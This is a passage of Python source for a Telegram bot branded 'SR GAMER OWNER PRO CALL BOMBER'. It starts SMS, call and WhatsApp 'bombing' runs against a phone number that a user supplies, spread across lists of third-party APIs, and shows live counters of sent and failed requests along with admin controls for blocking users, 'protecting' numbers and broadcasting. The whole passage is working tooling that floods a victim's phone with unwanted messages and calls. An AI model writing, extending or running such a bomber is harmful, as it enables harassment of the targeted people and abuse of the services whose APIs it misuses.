        mode_names = {'sms': 'SMS', 'call': 'CALL', 'whatsapp': 'WHATSAPP', 'mix': 'MIX'}
        mode_name = mode_names.get(mode, 'MIX')
        mode_emoji = {'sms': '📱', 'call': '📞', 'whatsapp': '💬', 'mix': '🔥'}
        em = mode_emoji.get(mode, '🔥')

        sent = bot.send_message(
            msg.chat.id,
            f"{em} <b>{mode_name} BOMBING started on <code>{phone}</code>!</b>\n"
            f"🔄 Sending to <code>{len(api_list)}</code> APIs...\n"
            f"⚡ <b>UNLIMITED SPEED</b>\n"
            f"⏹️ Press STOP to stop."
        )

        stop_event = threading.Event()
        bomber = UltimateBomber(phone, api_list, stop_event=stop_event)
        if user_id not in active_bombers:
            active_bombers[user_id] = []
        active_bombers[user_id].append(bomber)

        def animator():
            frames = ["⚡", "🔥", "💥", "💫", "✨", "🌟"]
            i = 0
            while not stop_event.is_set():
                frame = frames[i % len(frames)]
                try:
                    bot.edit_message_text(
                        f"{frame} <b>{mode_name} BOMBING...</b> {frame}\n"
                        f"━━━━━━━━━━━━━━━━━━\n"
                        f"🎯 Target: <code>{phone}</code>\n"
                        f"✅ Sent: <code>{bomber.success}</code>\n"
                        f"❌ Failed: <code>{bomber.failed}</code>\n"
                        f"⚡ Total: <code>{bomber.total}</code>\n"
                        f"━━━━━━━━━━━━━━━━━━",
                        msg.chat.id, sent.message_id, parse_mode="HTML"
                    )
                except Exception:
                    pass
                i += 1
                time.sleep(1.2)

        threading.Thread(target=animator, daemon=True).start()

        def task(bomber_obj):
            try:
                res = bomber_obj.run()
                if user_id in active_bombers and bomber_obj in active_bombers[user_id]:
                    active_bombers[user_id].remove(bomber_obj)
                    if not active_bombers[user_id]:
                        del active_bombers[user_id]
                if stop_event.is_set():
                    msg_text = (
                        f"⏹️ <b>STOPPED</b>\n"
                        f"🎯 Target: <code>{phone}</code>\n"
                        f"✅ Success: <code>{bomber_obj.success}</code>\n"
                        f"❌ Failed: <code>{bomber_obj.failed}</code>\n"
                        f"📊 Total: <code>{res['total_requests']}</code>"
                    )
                else:
                    msg_text = (
                        f"✅ <b>DONE!</b>\n"
                        f"🎯 Target: <code>{phone}</code>\n"
                        f"✅ Success: <code>{res['success']}</code>\n"
                        f"❌ Failed: <code>{res['failed']}</code>\n"
                        f"📊 Total: <code>{res['total_requests']}</code>"
                    )
                try:
                    bot.edit_message_text(msg_text, msg.chat.id, sent.message_id, parse_mode="HTML")
                except Exception:
                    try: bot.send_message(msg.chat.id, msg_text)
                    except Exception: pass
            except Exception as e:
                print(f"Task error: {e}")

        threading.Thread(target=task, args=(bomber,), daemon=True).start()
    except Exception as e:
        print(f"Phone handler error: {e}")
        try: bot.send_message(msg.chat.id, f"❌ Error: {str(e)}")
        except Exception: pass

# ---------- Admin Process Functions ----------
def add_admin_process(msg):
    try:
        if not is_master(msg.from_user.id): return
        if msg.text and msg.text.isdigit() and int(msg.text) not in admins():
            add_admin(int(msg.text))
            bot.send_message(msg.chat.id, f"✅ <code>{msg.text}</code> added.")
        else:
            bot.send_message(msg.chat.id, "❌ Invalid or already admin.")
    except Exception: pass

def add_channel_process(msg):
    try:
        if not is_admin(msg.from_user.id): return
        ch = msg.text.strip() if msg.text else ""
        if ch.startswith("@") and len(ch) > 1:
            add_channel(ch)
            bot.send_message(msg.chat.id, f"✅ <code>{ch}</code> added.")
        else:
            bot.send_message(msg.chat.id, "❌ Invalid channel (use @username).")
    except Exception: pass

def block_process(msg):
    try:
        if not is_admin(msg.from_user.id): return
        if msg.text and msg.text.isdigit():
            set_blocked(int(msg.text), True)
            bot.send_message(msg.chat.id, f"🚫 Blocked <code>{msg.text}</code>.")
        else:
            bot.send_message(msg.chat.id, "❌ Invalid ID.")
    except Exception: pass

def unblock_process(msg):
    try:
        if not is_admin(msg.from_user.id): return
        if msg.text and msg.text.isdigit():
            set_blocked(int(msg.text), False)
            bot.send_message(msg.chat.id, f"♻️ Unblocked <code>{msg.text}</code>.")
        else:
            bot.send_message(msg.chat.id, "❌ Invalid ID.")
    except Exception: pass

def protect_process(msg):
    try:
        if not is_admin(msg.from_user.id): return
        number = ''.join(filter(str.isdigit, msg.text or ""))
        if len(number) == 10:
            protect_number(number)
            bot.send_message(msg.chat.id, f"🛡️ Protected <code>{number}</code>.")
        else:
            bot.send_message(msg.chat.id, "❌ Invalid number. Use 10 digits.")
    except Exception: pass

def broadcast_process(msg):
    try:
        if not is_admin(msg.from_user.id): return
        users = get_all_users()
        sent = 0
        for u in users:
            if u[3] == 0:
                try:
                    bot.copy_message(u[0], msg.chat.id, msg.message_id)
                    sent += 1
                    time.sleep(0.03)
                except Exception: pass
        bot.send_message(msg.chat.id, f"📣 Broadcast sent to <code>{sent}</code> users.")
    except Exception: pass

# ============================================================
# RUN
# ============================================================
if __name__ == "__main__":
    init_db()
    print("══════════════════════════════════════════")
    print("🔥 SR GAMER OWNER PRO CALL BOMBER ☠️")
    print(f"👑 Owner: {OWNER_NAME}")
    print(f"📱 SMS APIs: {len(SMS_APIS)}")
    print(f"📞 Call APIs: {len(CALL_APIS)}")
    print(f"💬 WhatsApp APIs: {len(WHATSAPP_APIS)}")
    print(f"🔥 Mix APIs: {len(MIX_APIS)}")
    print("✅ ANIMATED UI")
    print("✅ UNLIMITED SPEED")
    print("✅ ZERO ERRORS")
    print("══════════════════════════════════════════")

    while True:
        try:
            bot.infinity_polling(timeout=30, long_polling_timeout=60)
        except Exception as e:
            print(f"Bot crashed: {e}. Restarting in 5 seconds...")
            time.sleep(5)
            continue
        break
